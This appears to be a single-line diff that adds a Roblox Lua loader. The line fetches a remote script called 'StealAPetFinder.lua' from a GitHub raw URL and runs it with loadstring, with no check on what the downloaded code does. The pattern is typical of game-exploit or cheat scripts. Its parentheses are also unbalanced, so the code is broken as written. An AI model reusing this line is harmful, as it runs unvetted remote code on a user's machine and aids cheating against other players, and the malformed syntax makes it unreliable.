@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Versefy1/Sap/main/StealAPetFinder.lua')()
